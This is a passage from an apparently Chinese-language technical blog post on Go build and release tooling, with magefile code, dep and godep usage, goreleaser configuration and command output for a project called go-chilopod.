mg.Deps(Build)</span><br><span class="line">	fmt.Println(<span class="string">"Installing..."</span>)</span><br><span class="line">	<span class="keyword">return</span> os.Rename(<span class="string">"./MyApp"</span>, <span class="string">"/usr/bin/MyApp"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Manage your deps, or running package managers.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InstallDeps</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">"Installing Deps..."</span>)</span><br><span class="line">	cmd := exec.Command(<span class="string">"go"</span>, <span class="string">"get"</span>, <span class="string">"github.com/stretchr/piglatin"</span>)</span><br><span class="line">	<span class="keyword">return</span> cmd.Run()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Clean up after yourself</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Clean</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">"Cleaning..."</span>)</span><br><span class="line">	os.RemoveAll(<span class="string">"MyApp"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Tools</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	<span class="comment">//mg.Deps(Protoc)</span></span><br><span class="line"></span><br><span class="line">	update := envBool(<span class="string">"UPDATE"</span>)</span><br><span class="line"></span><br><span class="line">	retool := <span class="string">"github.com/twitchtv/retool"</span></span><br><span class="line"></span><br><span class="line">	args := []<span class="keyword">string</span>&#123;<span class="string">"get"</span>, retool&#125;</span><br><span class="line">	<span class="keyword">if</span> update &#123;</span><br><span class="line">		args = []<span class="keyword">string</span>&#123;<span class="string">"get"</span>, <span class="string">"-u"</span>, retool&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err := sh.Run(<span class="string">"go"</span>, args...); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sh.Run(<span class="string">"retool"</span>, <span class="string">"sync"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// retool runs a command using a retool-cached binary.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">retool</span><span class="params">(cmd <span class="keyword">string</span>, args ...<span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> sh.Run(<span class="string">"retool"</span>, <span class="built_in">append</span>([]<span class="keyword">string</span>&#123;<span class="string">"do"</span>, cmd&#125;, args...)...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Release</span><span class="params">()</span> <span class="params">(err error)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> os.Getenv(<span class="string">"TAG"</span>) == <span class="string">""</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> errors.New(<span class="string">"TAG environment variable is required"</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err := sh.RunV(<span class="string">"git"</span>, <span class="string">"tag"</span>, <span class="string">"-a"</span>, <span class="string">"$TAG"</span>, <span class="string">"-m"</span>, <span class="string">"add tag $TAG by mage tools"</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err := sh.RunV(<span class="string">"git"</span>, <span class="string">"push"</span>, <span class="string">"origin"</span>, <span class="string">"$TAG"</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			sh.RunV(<span class="string">"git"</span>, <span class="string">"tag"</span>, <span class="string">"--delete"</span>, <span class="string">"$TAG"</span>)</span><br><span class="line">			sh.RunV(<span class="string">"git"</span>, <span class="string">"push"</span>, <span class="string">"--delete"</span>, <span class="string">"origin"</span>, <span class="string">"$TAG"</span>)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line">	<span class="keyword">return</span> sh.RunV(<span class="string">"goreleaser"</span>, <span class="string">"release"</span>, <span class="string">"--skip-publish"</span>, <span class="string">"--rm-dist"</span>)</span><br><span class="line">	<span class="comment">//return retool("goreleaser")</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ldflags</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	timestamp := time.Now().Format(time.RFC3339)</span><br><span class="line">	hash := hash()</span><br><span class="line">	tag := tag()</span><br><span class="line">	<span class="keyword">if</span> tag == <span class="string">""</span> &#123;</span><br><span class="line">		tag = <span class="string">"dev"</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> fmt.Sprintf(<span class="string">`-X "github.com/riboseyim/project/proj.timestamp=%s" `</span>+</span><br><span class="line">		<span class="string">`-X "github.com/riboseyim/project/proj.commitHash=%s" `</span>+</span><br><span class="line">		<span class="string">`-X "github.com/riboseyim/project/proj.gitTag=%s"`</span>, timestamp, hash, tag)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// tag returns the git tag for the current branch or "" if none.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">tag</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	s, _ := sh.Output(<span class="string">"git"</span>, <span class="string">"describe"</span>, <span class="string">"--tags"</span>)</span><br><span class="line">	<span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hash returns the git hash for the current repo or "" if none.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hash</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	hash, _ := sh.Output(<span class="string">"git"</span>, <span class="string">"rev-parse"</span>, <span class="string">"--short"</span>, <span class="string">"HEAD"</span>)</span><br><span class="line">	<span class="keyword">return</span> hash</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">envBool</span><span class="params">(key <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	value := os.Getenv(key)</span><br><span class="line">	<span class="keyword">if</span> value != <span class="string">""</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">$ mage build</span><br><span class="line">Installing Deps...</span><br><span class="line"># github.com/riboseyim/<span class="keyword">go</span>-chilopod/vendor/<span class="keyword">go</span>.opencensus.io/trace</span><br><span class="line">vendor/<span class="keyword">go</span>.opencensus.io/trace/trace_go11.<span class="keyword">go</span>:<span class="number">30</span>:<span class="number">9</span>: undefined: trace.NewContext</span><br><span class="line">Error: running <span class="string">"go build -o go-chilopod -ldflags=-X "</span>github.com/riboseyim/project/proj.timestamp=<span class="number">2018</span><span class="number">-12</span><span class="number">-30</span>T21:<span class="number">54</span>:<span class="number">20</span>+<span class="number">08</span>:<span class="number">00</span><span class="string">" -X "</span>github.com/riboseyim/project/proj.commitHash=<span class="number">042e38</span>b<span class="string">" -X "</span>github.com/riboseyim/project/proj.gitTag=v0<span class="number">.1</span><span class="number">.1</span><span class="string">" github.com/riboseyim/go-chilopod"</span> failed with exit code <span class="number">2</span></span><br><span class="line"></span><br><span class="line">$ dep ensure -update</span><br></pre></td></tr></table></figure>
<h2 id="构建工具集"><a href="#构建工具集" class="headerlink" title="构建工具集"></a>构建工具集</h2><ul>
<li>集成管理：mage</li>
<li>依赖管理：godep、retool</li>
<li>发布管理：goreleaser</li>
</ul>
<h4 id="依赖管理工具定位"><a href="#依赖管理工具定位" class="headerlink" title="依赖管理工具定位"></a>依赖管理工具定位</h4><ul>
<li>go get：管理 $GOPATH 代码</li>
<li>依赖管理工具定位为管理应用代码</li>
</ul>
<h4 id="依赖分析工具：godag"><a href="#依赖分析工具：godag" class="headerlink" title="依赖分析工具：godag"></a>依赖分析工具：godag</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">godag --pkg_name=github.com/magefile/mage --pkg_path=/Users/yanrui/go/src/github.com/magefile/mage --depth=1 --dot_file_path=mage.dot</span><br></pre></td></tr></table></figure>
<h4 id="go-dep"><a href="#go-dep" class="headerlink" title="go dep"></a>go dep</h4><blockquote>
<p>Dep is a tool for managing dependencies for Go projects</p>
</blockquote>
<ul>
<li>dep init: Gopkg.toml、vendor</li>
<li>dep ensure: Gopkg.lock</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">$ dep</span><br><span class="line">Commands:</span><br><span class="line">  init     Set up a <span class="built_in">new</span> Go project, or migrate an existing one</span><br><span class="line">  status   Report the status of the projects dependencies</span><br><span class="line">  ensure   Ensure a dependency is safely vendored in the project</span><br><span class="line">  version  Show the dep version information</span><br><span class="line">  check    Check <span class="keyword">if</span> imports, Gopkg.toml, and Gopkg.lock are in sync</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">  dep init                               set up a <span class="built_in">new</span> project</span><br><span class="line">  dep ensure                             install the projects dependencies</span><br><span class="line">  dep ensure -update                     update the locked versions of all dependencies</span><br><span class="line">  dep ensure -add github.com/pkg/errors  add a dependency to the project</span><br><span class="line"></span><br><span class="line"><span class="comment">// Error</span></span><br></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">$ dep init</span><br><span class="line">Importing configuration from govendor.</span><br><span class="line">These are only initial constraints, and are further refined during the solve process.</span><br><span class="line">Detected govendor configuration file...</span><br><span class="line">Converting from vendor.json...</span><br><span class="line">  Trying * (b1433c2) as initial lock <span class="keyword">for</span> imported dep github.com/Shopify/sarama</span><br><span class="line">  Trying * (ecdeabc) as initial lock <span class="keyword">for</span> imported dep github.com/davecgh/<span class="keyword">go</span>-spew</span><br><span class="line">  Trying * (b1fe83b) as initial lock <span class="keyword">for</span> imported dep github.com/eapache/<span class="keyword">go</span>-resiliency</span><br><span class="line">  Trying * (bb955e0) as initial lock <span class="keyword">for</span> imported dep github.com/eapache/<span class="keyword">go</span>-xerial-snappy</span><br><span class="line">  Using ^<span class="number">1.1</span><span class="number">.0</span> as initial constraint <span class="keyword">for</span> imported dep github.com/eapache/queue</span><br><span class="line">	..........</span><br><span class="line">  Locking in  (e19ae14) <span class="keyword">for</span> direct dep golang.org/x/text</span><br><span class="line">  Locking in v1<span class="number">.17</span><span class="number">.0</span> (df01485) <span class="keyword">for</span> transitive dep google.golang.org/grpc</span><br><span class="line">  Locking in  (<span class="number">7560714</span>) <span class="keyword">for</span> direct dep github.com/google/goexpect</span><br><span class="line">  Locking in  (fe724d1) <span class="keyword">for</span> direct dep github.com/magefile/mage</span><br><span class="line">Old vendor backed up to /Users/yanrui/<span class="keyword">go</span>/src/github.com/riboseyim/<span class="keyword">go</span>-chilopod/_vendor<span class="number">-20181230213719</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aca80164:<span class="keyword">go</span>-chilopod kurui$ dep status</span><br><span class="line">PROJECT                              CONSTRAINT     VERSION        REVISION  LATEST   PKGS USED</span><br><span class="line">github.com/Shopify/sarama            *                             b1433c2            <span class="number">1</span>   </span><br><span class="line"><span class="keyword">go</span>.opencensus.io                     *                             <span class="number">9f</span>6adc5            <span class="number">3</span>  </span><br><span class="line">github.com/eapache/queue             v1<span class="number">.1</span><span class="number">.0</span>         v1<span class="number">.1</span><span class="number">.0</span>         <span class="number">44</span>cc805   v1<span class="number">.1</span><span class="number">.0</span>   <span class="number">1</span>     </span><br><span class="line">github.com/pierrec/lz4               v1<span class="number">.1</span>           v1<span class="number">.1</span>           <span class="number">2f</span>cda4c   v1<span class="number">.1</span>     <span class="number">1</span>  </span><br><span class="line">github.com/soniah/gosnmp             branch master  branch master  cd9a07a   cd9a07a  <span class="number">1</span>  </span><br><span class="line">github.com/sparrc/<span class="keyword">go</span>-ping            branch master  branch master  ef3ab45   ef3ab45  <span class="number">1</span>  </span><br><span class="line">google.golang.org/grpc               v1<span class="number">.17</span><span class="number">.0</span>        v1<span class="number">.17</span><span class="number">.0</span>        df01485   v1<span class="number">.17</span><span class="number">.0</span>  <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h4 id="godep"><a href="#godep" class="headerlink" title="godep"></a>godep</h4><blockquote>
<p>Godep is a tool for managing Go package dependencies.</p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">godep <span class="keyword">go</span> run</span><br><span class="line">godep <span class="keyword">go</span> build</span><br></pre></td></tr></table></figure>
<p>注意：</p>
<ul>
<li>1) 如果使用 godep 包管理工具则不能在使用 go run 和 go build，否则还是会到 $GOPATH 目录匹配第三方库。</li>
<li>2) 目录结构 ./Godeps 、./vendor</li>
<li>3) 安装问题：墙内用户可能会遇到 can not found golang.org/x/…</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">$ godep</span><br><span class="line">Usage:</span><br><span class="line">	godep command [arguments]</span><br><span class="line"></span><br><span class="line">The commands are:</span><br><span class="line">    save     list and <span class="built_in">copy</span> dependencies into Godeps</span><br><span class="line">    <span class="keyword">go</span>       run the <span class="keyword">go</span> tool with saved dependencies</span><br><span class="line">    get      download and install packages with specified dependencies</span><br><span class="line">    path     <span class="built_in">print</span> GOPATH <span class="keyword">for</span> dependency code</span><br><span class="line">    restore  check out listed dependency versions in GOPATH</span><br><span class="line">    update   update selected packages or the <span class="keyword">go</span> version</span><br><span class="line">    diff     shows the diff between current and previously saved set of dependencies</span><br><span class="line">    version  show version info</span><br><span class="line"></span><br><span class="line"><span class="comment">//官方:GFW Error can not found golang.org/x/.......</span></span><br><span class="line"><span class="keyword">go</span> get github.com/tools/godep</span><br><span class="line"></span><br><span class="line"><span class="comment">//镜像:https://github.com/golang/tools</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> get github.com/golang/tools</span><br><span class="line"></span><br><span class="line">mkdir $GOPATH/src/golang.org/x</span><br><span class="line"></span><br><span class="line"><span class="comment">// 安装 godep -&gt; $GOPATH\bin</span></span><br><span class="line"><span class="keyword">go</span> get github.com/tools/godep</span><br></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">$ godep save</span><br><span class="line">drwxr-xr-x   <span class="number">4</span> kurui  staff   <span class="number">128</span> <span class="number">12</span> <span class="number">24</span> <span class="number">11</span>:<span class="number">18</span> Godeps</span><br><span class="line">$ ls -rlt Godeps</span><br><span class="line">-rw-r--r--  <span class="number">1</span> kurui  staff   <span class="number">136</span> <span class="number">12</span> <span class="number">24</span> <span class="number">11</span>:<span class="number">18</span> Readme</span><br><span class="line">-rw-r--r--  <span class="number">1</span> kurui  staff  <span class="number">4074</span> <span class="number">12</span> <span class="number">24</span> <span class="number">11</span>:<span class="number">18</span> Godeps.json</span><br><span class="line"></span><br><span class="line">$ more Godeps/Godeps.json</span><br><span class="line">&#123;</span><br><span class="line">        <span class="string">"ImportPath"</span>: <span class="string">"github.com/riboseyim/go-chilopod"</span>,</span><br><span class="line">        <span class="string">"GoVersion"</span>: <span class="string">"go1.11"</span>,</span><br><span class="line">        <span class="string">"GodepVersion"</span>: <span class="string">"v80"</span>,</span><br><span class="line">        <span class="string">"Deps"</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="string">"ImportPath"</span>: <span class="string">"github.com/Shopify/sarama"</span>,</span><br><span class="line">                        <span class="string">"Comment"</span>: <span class="string">"v1.15.0-13-gb1433c2"</span>,</span><br><span class="line">                        <span class="string">"Rev"</span>: <span class="string">"b1433c29241f23cec4704daf4d25358b7b3fbf9e"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="string">"ImportPath"</span>: <span class="string">"github.com/davecgh/go-spew/spew"</span>,</span><br><span class="line">                        <span class="string">"Comment"</span>: <span class="string">"v1.1.0-9-gecdeabc"</span>,</span><br><span class="line">                        <span class="string">"Rev"</span>: <span class="string">"ecdeabc65495df2dec95d7c4a4c3e021903035e5"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="string">"ImportPath"</span>: <span class="string">"github.com/eapache/go-resiliency/breaker"</span>,</span><br><span class="line">                        <span class="string">"Comment"</span>: <span class="string">"v1.0.0-6-gb1fe83b"</span>,</span><br><span class="line">                        <span class="string">"Rev"</span>: <span class="string">"b1fe83b5b03f624450823b751b662259ffc6af70"</span></span><br><span class="line">                &#125;,</span><br><span class="line">				.......</span><br><span class="line">				]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ ls -rlt vendor/</span><br><span class="line">drwxr-xr-x  <span class="number">14</span> kurui  staff   <span class="number">448</span> <span class="number">12</span> <span class="number">23</span> <span class="number">21</span>:<span class="number">12</span> github.com</span><br><span class="line">drwxr-xr-x   <span class="number">3</span> kurui  staff    <span class="number">96</span> <span class="number">12</span> <span class="number">23</span> <span class="number">21</span>:<span class="number">12</span> golang.org</span><br><span class="line">-rw-r--r--   <span class="number">1</span> kurui  staff  <span class="number">8279</span> <span class="number">12</span> <span class="number">23</span> <span class="number">21</span>:<span class="number">12</span> vendor.json</span><br><span class="line">drwxr-xr-x   <span class="number">6</span> kurui  staff   <span class="number">192</span> <span class="number">12</span> <span class="number">24</span> <span class="number">11</span>:<span class="number">18</span> <span class="keyword">go</span>.opencensus.io</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新</span></span><br><span class="line">$ <span class="keyword">go</span> get a/b/xxx</span><br><span class="line">$ godep update a/b/..</span><br></pre></td></tr></table></figure>
<h4 id="Retool"><a href="#Retool" class="headerlink" title="Retool"></a>Retool</h4><ul>
<li><a href="https://github.com/twitchtv/retool" target="_blank" rel="noopener">Project Retool</a></li>
</ul>
<blockquote>
<p>It’s like dep but for go tools, pinning revisions so that all your developers run the exact same version.</p>
</blockquote>
<h4 id="Goreleaser"><a href="#Goreleaser" class="headerlink" title="Goreleaser"></a>Goreleaser</h4><ul>
<li><a href="https://goreleaser.com/" target="_blank" rel="noopener">Project Goreleaser</a></li>
</ul>
<blockquote>
<p>GoReleaser will build the binaries for your app for Windows, Linux and macOS, both amd64 and i386 architectures</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ brew install goreleaser</span><br><span class="line">$ cp /usr/<span class="built_in">local</span>/Cellar/goreleaser/0.94.0/bin/goreleaser /user/<span class="built_in">local</span>/bin/</span><br><span class="line">$</span><br><span class="line">$ goreleaser init</span><br><span class="line">• Generating .goreleaser.yml file</span><br><span class="line">• config created; please edit accordingly to your needs file=.goreleaser.yml</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<ul>
<li>goreleaser.yml</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This is an example goreleaser.yaml file with some sane defaults.</span></span><br><span class="line"><span class="comment"># Make sure to check the documentation at http://goreleaser.com</span></span><br><span class="line">before:</span><br><span class="line">  hooks:</span><br><span class="line">    <span class="comment"># you may remove this if you don't use vgo</span></span><br><span class="line">    - go mod download</span><br><span class="line">    <span class="comment"># you may remove this if you don't need go generate</span></span><br><span class="line">    - go generate ./...</span><br><span class="line">builds:</span><br><span class="line">- env:</span><br><span class="line">  - CGO_ENABLED=0</span><br><span class="line">archive:</span><br><span class="line">  replacements:</span><br><span class="line">    darwin: Darwin</span><br><span class="line">    linux: Linux</span><br><span class="line">    windows: Windows</span><br><span class="line">    386: i386</span><br><span class="line">    amd64: x86_64</span><br><span class="line">checksum:</span><br><span class="line">  name_template: <span class="string">'checksums.txt'</span></span><br><span class="line">snapshot:</span><br><span class="line">  name_template: <span class="string">"&#123;&#123; .Tag &#125;&#125;-next"</span></span><br><span class="line">changelog:</span><br><span class="line">  sort: asc</span><br><span class="line">  filters:</span><br><span class="line">    exclude:</span><br><span class="line">    - <span class="string">'^docs:'</span></span><br><span class="line">    - <span class="string">'^test:'</span></span><br></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">$ git tag -a v0<span class="number">.1</span><span class="number">.0</span> -m <span class="string">"First release"</span></span><br><span class="line">$ git push --tags origin master</span><br><span class="line">$ goreleaser release --skip-publish</span><br><span class="line"></span><br><span class="line">   • releasing using goreleaser <span class="number">0.94</span><span class="number">.0</span>...</span><br><span class="line">   • loading config file       file=.goreleaser.yml</span><br><span class="line">   • RUNNING BEFORE HOOKS</span><br><span class="line">      • running <span class="keyword">go</span> generate ./...</span><br><span class="line">   • GETTING AND VALIDATING GIT STATE</span><br><span class="line">      • releasing v0<span class="number">.1</span><span class="number">.0</span>, commit <span class="number">1f</span>47832dffd1c84f65a16ed01868bb29f1419e0e</span><br><span class="line">   • SETTING DEFAULTS</span><br><span class="line">      • Invalid value %!s(MISSING) <span class="keyword">for</span> prerelease. Should be auto, <span class="literal">true</span> or <span class="literal">false</span></span><br><span class="line">   • CHECKING ./DIST  </span><br><span class="line">   • WRITING EFFECTIVE CONFIG FILE</span><br><span class="line">      • writing                   config=dist/config.yaml</span><br><span class="line">   • GENERATING CHANGELOG</span><br><span class="line">      • writing                   changelog=dist/CHANGELOG.md</span><br><span class="line">   • LOADING ENVIRONMENT VARIABLES</span><br><span class="line">      • skipped                   reason=publishing is disabled</span><br><span class="line">   • BUILDING BINARIES</span><br><span class="line">      • building                  binary=dist/linux_386/<span class="keyword">go</span>-chilopod</span><br><span class="line">      • building                  binary=dist/darwin_amd64/<span class="keyword">go</span>-chilopod</span><br><span class="line">      • building                  binary=dist/darwin_386/<span class="keyword">go</span>-chilopod</span><br><span class="line">      • building                  binary=dist/linux_amd64/<span class="keyword">go</span>-chilopod</span><br><span class="line">   • ARCHIVES         </span><br><span class="line">      • creating                  archive=dist/<span class="keyword">go</span>-chilopod_0<span class="number">.1</span><span class="number">.0</span>_Linux_i386.tar.gz</span><br><span class="line">      • creating                  archive=dist/<span class="keyword">go</span>-chilopod_0<span class="number">.1</span><span class="number">.0</span>_Darwin_i386.tar.gz</span><br><span class="line">      • creating                  archive=dist/<span class="keyword">go</span>-chilopod_0<span class="number">.1</span><span class="number">.0</span>_Darwin_x86_64.tar.gz</span><br><span class="line">      • creating                  archive=dist/<span class="keyword">go</span>-chilopod_0<span class="number">.1</span><span class="number">.0</span>_Linux_x86_64.tar.gz</span><br><span class="line">   • LINUX PACKAGES WITH NFPM</span><br><span class="line">      • skipped                   reason=no output formats configured</span><br><span class="line">   • SNAPCRAFT PACKAGES</span><br><span class="line">      • skipped                   reason=no summary nor description were provided</span><br><span class="line">   • CALCULATING CHECKSUMS</span><br><span class="line">      • checksumming              file=<span class="keyword">go</span>-chilopod_0<span class="number">.1</span><span class="number">.0</span>_Linux_x86_64.tar.gz</span><br><span class="line">      • checksumming              file=<span class="keyword">go</span>-chilopod_0<span class="number">.1</span><span class="number">.0</span>_Darwin_i386.tar.gz</span><br><span class="line">      • checksumming              file=<span class="keyword">go</span>-chilopod_0<span class="number">.1</span><span class="number">.0</span>_Linux_i386.tar.gz</span><br><span class="line">      • checksumming              file=<span class="keyword">go</span>-chilopod_0<span class="number">.1</span><span class="number">.0</span>_Darwin_x86_64.tar.gz</span><br><span class="line">   • SIGNING ARTIFACTS</span><br><span class="line">      • skipped                   reason=artifact signing is disabled</span><br><span class="line">   • DOCKER IMAGES    </span><br><span class="line">      • skipped                   reason=docker section is not configured</span><br><span class="line">   • PUBLISHING       </span><br><span class="line">      • skipped                   reason=publishing is disabled</span><br><span class="line">   • release succeeded after <span class="number">13.70s</span></span><br></pre></td></tr></table></figure>
<h4 id="Mage"><a href="#Mage" class="headerlink" title="Mage"></a>Mage</h4><ul>
<li><a href="https://magefile.org" target="_blank" rel="noopener">Project Mage</a></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">$ <span class="keyword">go</span> get -u -d github.com/magefile/mage</span><br><span class="line">$ cd $GOPATH/src/github.com/magefile/mage</span><br><span class="line">$ <span class="keyword">go</span> run bootstrap.<span class="keyword">go</span></span><br><span class="line">Running target: Install</span><br><span class="line">exec: <span class="keyword">go</span> env GOPATH</span><br><span class="line">exec: git rev-parse --short HEAD</span><br><span class="line">exec: git describe --tags</span><br><span class="line">exec: <span class="keyword">go</span> build -o /Users/yanrui/<span class="keyword">go</span>/bin/mage -ldflags=-X <span class="string">"github.com/magefile/mage/mage.timestamp=2018-12-10T10:36:22+08:00"</span> -X <span class="string">"github.com/magefile/mage/mage.commitHash=fe724d1"</span> -X <span class="string">"github.com/magefile/mage/mage.gitTag=v1.7.1-2-gfe724d1"</span> github.com/magefile/mage</span><br><span class="line"></span><br><span class="line">$ cd $project/test</span><br><span class="line">$ mage build</span><br><span class="line">$ mage -compile ./static-output</span><br></pre></td></tr></table></figure>
<ul>
<li>default magefile.go</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// mage -init</span></span><br><span class="line"><span class="comment">// +build mage</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	<span class="string">"os"</span></span><br><span class="line">	<span class="string">"os/exec"</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"github.com/magefile/mage/mg"</span> <span class="comment">// mg contains helpful utility functions, like Deps</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Default target to run when none is specified</span></span><br><span class="line"><span class="comment">// If not set, running mage will list available targets</span></span><br><span class="line"><span class="comment">// var Default = Build</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// A build step that requires additional params, or platform specific steps for example</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Build</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">	mg.Deps(Dep)</span><br><span class="line">	<span class="keyword">return</span> sh.RunV(<span class="string">"go"</span>, <span class="string">"build"</span>, <span class="string">"-o"</span>, <span class="string">"project"</span>, <span class="string">"-ldflags="</span>+ldflags(), <span class="string">"github.com/riboseyim/chilopod"</span>)</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">		<span class="comment">//mg.Deps(Dep)</span></span><br><span class="line">    <span class="comment">//return sh.RunV("go", "build", "-o", "$MATTEL_REPO", "-ldflags="+ldflags(), "github.com/riboseyim/$MATTEL_REPO")</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// A custom install step if you need your bin someplace other than go/bin</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Install</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	mg.Deps(Build)</span><br><span class="line">	fmt.Println(<span class="string">"Installing..."</span>)</span><br><span class="line">	<span class="keyword">return</span> os.Rename(<span class="string">"./MyApp"</span>, <span class="string">"/usr/bin/MyApp"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Manage your deps, or running package managers.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InstallDeps</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">"Installing Deps..."</span>)</span><br><span class="line">	cmd := exec.Command(<span class="string">"go"</span>, <span class="string">"get"</span>, <span class="string">"github.com/stretchr/piglatin"</span>)</span><br><span class="line">	<span class="keyword">return</span> cmd.Run()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Clean up after yourself</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Clean</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">"Cleaning..."</span>)</span><br><span class="line">	os.RemoveAll(<span class="string">"MyApp"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>mage options</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mage [options] [target]</span><br><span class="line"></span><br><span class="line">Mage is a make-like command runner.  See https:<span class="comment">//magefile.org for full docs.</span></span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  -clean    clean out old generated binaries from CACHE_DIR</span><br><span class="line">  -compile &lt;<span class="built_in">string</span>&gt;</span><br><span class="line">            output a <span class="keyword">static</span> binary to the given path</span><br><span class="line">  -init     create a starting <span class="keyword">template</span> <span class="keyword">if</span> no mage files exist</span><br><span class="line">  -l        <span class="built_in">list</span> mage targets in <span class="keyword">this</span> directory</span><br><span class="line">  -h        show <span class="keyword">this</span> help</span><br><span class="line">  -version  show version info <span class="keyword">for</span> the mage binary</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -d &lt;<span class="built_in">string</span>&gt;</span><br><span class="line">          <span class="function">run magefiles in the given <span class="title">directory</span> <span class="params">(<span class="keyword">default</span> <span class="string">"."</span>)</span></span></span><br><span class="line">  -debug  turn on debug messages</span><br><span class="line">  -h      show description of a target</span><br><span class="line">  -f      force recreation of compiled magefile</span><br><span class="line">  -keep   keep intermediate mage files around after running</span><br><span class="line">  